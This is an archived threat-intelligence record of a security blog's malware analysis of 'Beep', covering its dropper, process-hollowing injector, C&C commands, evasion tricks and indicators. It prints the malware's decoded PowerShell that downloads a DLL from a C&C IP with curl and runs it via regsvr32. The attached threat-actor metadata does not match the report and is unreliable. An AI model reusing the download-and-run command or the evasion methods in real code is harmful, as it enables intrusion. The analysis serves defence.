{
    "id": "5927ee50-831f-4d32-b5d3-643b89e8f2d3",
    "created_at": "2023-03-03T02:05:49.146522Z",
    "updated_at": "2025-03-27T02:08:40.360543Z",
    "deleted_at": null,
    "sha1_hash": "7b760be35ebfba65d9edc3a7e2937c5ede08e81e",
    "title": "2023-02-13 - Beepin’ Out of the Sandbox- Analyzing a New, Extremely Evasive Malware",
    "authors": "",
    "file_creation_date": "2023-03-01T09:34:47Z",
    "file_modification_date": "2023-03-01T09:34:47Z",
    "file_size": 498767,
    "plain_text": "# Beepin’ Out of the Sandbox: Analyzing a New, Extremely Evasive Malware\n\n**[minerva-labs.com/blog/beepin-out-of-the-sandbox-analyzing-a-new-extremely-evasive-malware/](https://minerva-labs.com/blog/beepin-out-of-the-sandbox-analyzing-a-new-extremely-evasive-malware/)**\n\nBlog\n\nNatalie Zargarov\n  | \n13.02.23\n  | \n8 Minutes Read\nLast week we discovered several new samples that were similar to each other and uploaded\nto VirusTotal (VT) in a form of .dll, .gif or .jpg files. They all were tagged as ‘spreader’ and\n‘detect-debug-environment’ by VT and caught our attention because they appeared to drop\nfiles, but those files could not be retrieved from VT.\n\n_Figure 1 – VT – Uploaded samples_\n\nOnce we dug into this sample, we observed the use of a significant amount of evasion\ntechniques. It seemed as if the authors of this malware were trying to implement as many\nanti-debugging and anti-VM (anti-sandbox) techniques as they could find. One such\n\n\n-----\n\ntechnique involved delaying execution through the use of the Beep API function, hence the\nmalware’s name.\n\n## Dropper\n\nAfter performing anti-debugging and anti-vm checks, the malware dropper (big.dll) creates\n_“\\Sessions\\2\\BaseNamedObjects\\{8B30B3CD-2068-4F75-AB1F-FCAE6AF928B6}” mutex. It_\nthen creates a new registry key ‘HKCU\\SOFTWARE\\nonresistantOutlivesDictatorial’ and sets\na new value named ‘AphroniaHaimavati’. The newly created value contains base64 data\nwhich decrypts to:\n\n_“$nonresistantOutlivesDictatorial =_\n_“$env:APPDATA\\Microsoft\\nonresistantOutlivesDictatorial\\AphroniaHaimavati.dll”;md_\n_$env:APPDATA\\Microsoft\\nonresistantOutlivesDictatorial;Start-Process (Get-Command_\n_curl.exe).Source -NoNewWindow -ArgumentList ‘–url_\n_https://37.1.215.220/messages/DBcB6q9SM6 -X POST –insecure –output ‘,_\n_$nonresistantOutlivesDictatorial;Start-Sleep -Seconds 40;$ungiantDwarfest = Get-Content_\n_$env:APPDATA\\Microsoft\\nonresistantOutlivesDictatorial\\AphroniaHaimavati.dll | %_\n_{[Convert]::FromBase64String($_)};Set-Content_\n_$env:APPDATA\\Microsoft\\nonresistantOutlivesDictatorial\\AphroniaHaimavati.dll -Value_\n_$ungiantDwarfest -Encoding Byte;regsvr32 /s_\n_$env:APPDATA\\Microsoft\\nonresistantOutlivesDictatorial\\AphroniaHaimavati.dll;”_\n\nThis is a PowerShell script that saves data to AphroniaHaimavati.dll using curl.exe, and then\nexecutes it with regsvr32.exe.\n\nBig.dll creates a scheduled task named after the mutex created earlier. This task runs every\n13 minutes and executes the PowerShell scripts stored in the registry:\n\n_Figure 2 – Scheduled task_\n\n## Injector\n\nThe purpose of the newly downloaded and executed AphroniaHaimavati.dll is to re-verify that\nit is not being debugged or running in a virtual environment by using additional antidebugging and anti-vm techniques. The dropper injects its malicious payload into a\nlegitimate WWAHost.exe (a Windows Wrap-Around Metro App Host) windows process using\n\n\n-----\n\nthe [Process Hollowing injection technique. The malware sets explorer.exe as the parent of](https://minerva-labs.com/blog/malware-evasion-memory-injection/)\nWWAHost.exe by adding the parent attribute to the process. Futher details of this technique\n[can be found here.](https://scorpiosoftware.net/2021/01/10/parent-process-vs-creator-process/)\n\n**Injected Payload**\n\nNot surprisingly, this stage implements several evasion techniques, including the same ones\nused previously by the dropper. After all evasions are completed, the malware creates the\nmutex ‘\\Sessions\\2\\BaseNamedObjects\\{99C10657-633C-4165-9D0A-082238CB9FE0}’.\nNext, it collects the victim’s information to be sent to the C&C server in JSON format:\n\n_“{“uuid”: “uuid“,_\n\n_“stream”: “bb_d2@T@dd48940b389148069ffc1db3f2f38c0e”,_\n\n_“os_version”: “victims_os_version including build number“,_\n\n_“product_number”: 48,_\n\n_“username”: “username retrieved by using GetUserNameW API function“,_\n\n_“pc_name”: “computer name retrieved by using GetComputerNameW API function“,_\n\n_“cpu_name”: “cpu_name“,_\n\n_“arch”: “system architecture (x64/x86)“,_\n\n_“pc_uptime”: 38209906,_\n\n_“gpu_name”: “gpu name retrieved by EnumDisplayDevicesW API function“,_\n\n_“ram_amount”: “ram amount retrieved by using GlobalMemoryStatusEx API function”,_\n\n_“screen_resolution”: “screen resolution“,_\n\n_“version”: “0.1.7”, – possibly the malwares version_\n\n_“av_software”: “unknown“,_\n\n_“domain_name”: “”,_\n\n_“domain_controller_name”: “unknown“,_\n\n_“domain_controller_address”: “unknown“}”_\n\nWhile the data collected would lead us to think that the malware checks which AV software is\nrunning on the victim’s machine, we did not find any AV check implementations in the code.\n\n\n-----\n\n_Figure 3 – Json with collect data._\n\nThe malware adds to the collected data “user_id=Him3xrn9e&team_id=JqLtxw1h” and then\nencrypts the entire string before sending it to the C&C server. However, by the time of our\nanalysis, the C&C was already down and sending requests to it failed. Despite this, the\nmalware continued to collect more data, even after 120 failed attempts to send the data. In\nthe sample analyzed, the malware used CreateToolhelp32Snapshot, Process32FirstW and\nProcess32NextW API functions to enumerate processes and collect their names and PIDs:\n\n_Figure 4 – Partial process list collected by the malware._\n\nThe process list was attempted to be sent to the other C&C URL\n(hxxps[:]//37.1.215.220/messages/ADXDAG6).\n\n\n-----\n\nEven though we could not continue to analyze the attack flow because the C&C went down,\nwe were still able to identify several commands that we assume the malware can accept\nfrom C&C server:\n\nbalancer – not implemented yet.\ninit – not implemented yet.\nscreenshoot – appears to collect the process list.\n\ntask – not implemented yet.\ndestroy – not implemented yet.\nshellcode – executes additional shellcode.\ndll – executes a dll file.\nexe – executes a .exe file.\n\nAdditional – collects additional info.\nknock_timeout – changes C&C “keep-alive” intervals.\n\nIt’s worth noting that the injected code also has Process Hollowing capability. We assume\nthat both, .exe and .dll files may be injected into another legitimate process.\n\n## Evasion Techniques\n\nThe Beep malware implements several evasion techniques, which it uses numerous times\nthroughout execution. These techniques include:\n\n\n-----\n\n**Dynamic string deobfuscation – a technique widely used by threat actors to prevent**\nimportant strings from being easily recovered. Mostly used for hiding imports, Beep\ncopies hardcoded obfuscated hex bytes into the memory and then deobfuscates them\nwith xor/sub/add/not assembly instructions.\n\n_Figure 5 – String Deobfuscation using add instruction._\n\n**Default Language check – A technique mostly used by authors from the former Soviet**\nUnion countries to evade infecting unwanted systems. Beep uses the\nGetUserDefaultLangID API function to retrieve the language identifier and check if it\nrepresents the following languages:\n\na. 419 – Russian\n\nb. 422 – Ukrainian\n\nc. 423 – Belarusian\n\nd. 428 – Tajik\n\ne. 424 – Slovenian\n\nf. 437 – Georgian\n\ng. 43F – Kazakh\n\nh. 843 – Uzbek (Cyrillic)\n\n**Assembly implementation of the IsDebuggerPresent API function – This**\ndetermines whether the current process is being debugged by a user-mode debugger\nby checking the BeingDebugged flag of the Process Environment Block (PEB).\n\n**NtGlobalFlag field anti-debugging – determines if the process was created by the**\n[debugger. More information can be found here.](https://anti-debug.checkpoint.com/techniques/debug-flags.html#manual-checks-ntglobalflag)\n\n\n-----\n\n_Figure 6 – NtGlobalFlag anti-debugging implementation_\n\n**RDTSC instruction – this instruction is used to determine how many CPU ticks have**\ntaken place since the processor was reset. This can also be used as an anti-debugging\ntechnique. The most common way to use this is to get the current timestamp using the\ninstruction, save it in a register, then get another timestamp and check if the delta\nbetween the two is below the number of ticks that were pre-defined by the author.\n\n_Figure 7 – RDTSC instructions anti-debugging_\n\n**Stack Segment Register – This is used to detect if the program is being traced. After**\nsingle-stepping in a debugger through the ‘push ss pop ss pushf’ instructions, the\n[Trap Flag will be set.](https://en.wikipedia.org/wiki/Trap_flag)\n\n_Figure 8 – Stack Segment Register anti-debugging._\n\n**CPUID anti-vm – The malware uses the cpuid instruction with EAX=40000000 as input**\nThe return value will be the Hypervisor Brand string, and then it checks if it contains a\npart of the word ‘VMware’.\n\n\n-----\n\n_Figure 9 – CPUID check_\n\n**VBOX registry key anti-vm – The malware uses RegOpenKeyExW API function to**\ncheck if the HKLM\\HARDWARE\\ACPI\\DSDT\\VBOX__ registry key exists.\n**Beep API function anti-sandbox – Malware usually uses the Sleep API function to**\ndelay execution and avoid detection by sandboxes. In this case, the malware uses the\n[Beep Windows API function. Accordign to MSDN: “Generates simple tones on the](https://learn.microsoft.com/en-us/windows/win32/api/utilapiset/nf-utilapiset-beep)\nspeaker. The function is synchronous; it performs an alertable wait and does not return\ncontrol to its caller until the sound finishes”. This function will suspend the execution of\nthe malware, achieving the same effect as the Sleep API function.\n\nThe injector (AphroniaHaimavati.dll) implements additional less widely used evasion\ntechniques:\n\n**INT 3 anti-debugging – The INT 3 assembly instruction is an interruption used as a**\nsoftware breakpoint. Without a debugger present, after reaching the INT3 instruction,\nthe exception EXCEPTION_BREAKPOINT (0x80000003) is generated, and an\nexception handler is called. If a debugger is present, the control is wi not given to the\nexception handler.\n\n_Figure 10 – INT 3 assembly instruction_\n\n**INT 2D anti-debugging – Similar to the INT 3 technique above, but in the case of INT**\n2D, the exception address is set to the EIP register and then the EIP register value is\nincremented. Some debuggers might have problems because after the EIP is\nincremented, the byte following the INT2D instruction will be skipped, potentially\ncontinuing execution from the damaged instruction.\n\n\n-----\n\n_Figure 11 – INT 2D assembly instruction_\n\n**CheckRemoteDebuggerPresent() API anti-debugging – This determines if a**\ndebugger is attached to the current process.\n\n**IsDebuggerPresent() API anti-debugging – This determines whether the current**\nprocess is being debugged by a user-mode debugger.\n\n**ProcessDebugPort anti-debugging – determines the port number of the debugger for**\nthe process using the NtQueryInformationProcess().\n\n**VirtualAlloc() / GetWriteWatch() anti-debugging – A rarely used anti-debugging**\ntechnique that causes the system to keep track of the pages that are written to the\ncommitted memory region. This can be abused to detect debuggers and hooks that\nmodify memory outside the expected pattern. More on this technique can be found\n[here.](https://anti-debug.checkpoint.com/techniques/misc.html#getwritewatch)\n\n**OutputDebugString() anti-debugging – This function is used to detect a debugger.**\nThe technique is simple: one can call OutputDebugString to pass a string to the\ndebugger. If a debugger is attached, then when the user code is returned, the value in\nEAX will be a valid address inside the process’s address space.\n\n**QueryPerformanceCounter() and GetTickCount64() anti-debugging – When a**\nprocess is being traced in a debugger, there is a noticeable delay between instructions\nand execution. The “native” delay between certain parts of code can be measured and\ncompared with the actual delay.\n\n**Summary**\n\nThe new Beep malware’s efforts to evade detection set it apart from other malware. The\nsheer number of evasive techniques it implements to avoid sandboxes, VMs, and other\ndebugging techniques is not often seen. Once this malware successfully penetrates a\nsystem, it can easily download and spread a wide range of additional malicious tools,\nincluding ransomware, making it extremely dangerous.\n\n## Minerva Prevention\n\nMinerva Armor’s [Anti Ransomware solution easily prevents this malware in its early stages.](https://minerva-labs.com/armor-platform/armor/)\nIn fact, Minerva Armor works best against malware when it tries to implement evasive\ntechniques to remain undetected. The more evasive the malware, the easier it is for Minerva\nto stop it\n\n\n-----\n\n_Figure 12 – Prevention_\n\nIOCs\n\nHashes:\n\nab5dc89a301b5296b29da8dc088b68d72d8b414767faf15bc45f4969c6e0874e – big.dll\n59F42ECDE152F78731E54EA27E761BBA748C9309A6AD1C2FD17F0E8B90F8AED1\n– AphroniaHaimavati.dll\n\nIP:\n\n37.1.215.220\n\nMutexes:\n\n\\Sessions\\2\\BaseNamedObjects\\{8B30B3CD-2068-4F75-AB1F-FCAE6AF928B6}\n\\Sessions\\2\\BaseNamedObjects\\{99C10657-633C-4165-9D0A-082238CB9FE0}\n\nResources\n\nhttps://anti-debug.checkpoint.com/\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-02-13 - Beepin’ Out of the Sandbox- Analyzing a New, Extremely Evasive Malware.pdf"
    ],
    "report_names": [
        "2023-02-13 - Beepin’ Out of the Sandbox- Analyzing a New, Extremely Evasive Malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1677809149,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1677663287,
    "ts_modification_date": 1677663287,
    "files": {
        "pdf": "https://archive.orkl.eu/7b760be35ebfba65d9edc3a7e2937c5ede08e81e.pdf",
        "text": "https://archive.orkl.eu/7b760be35ebfba65d9edc3a7e2937c5ede08e81e.txt",
        "img": "https://archive.orkl.eu/7b760be35ebfba65d9edc3a7e2937c5ede08e81e.jpg"
    }
}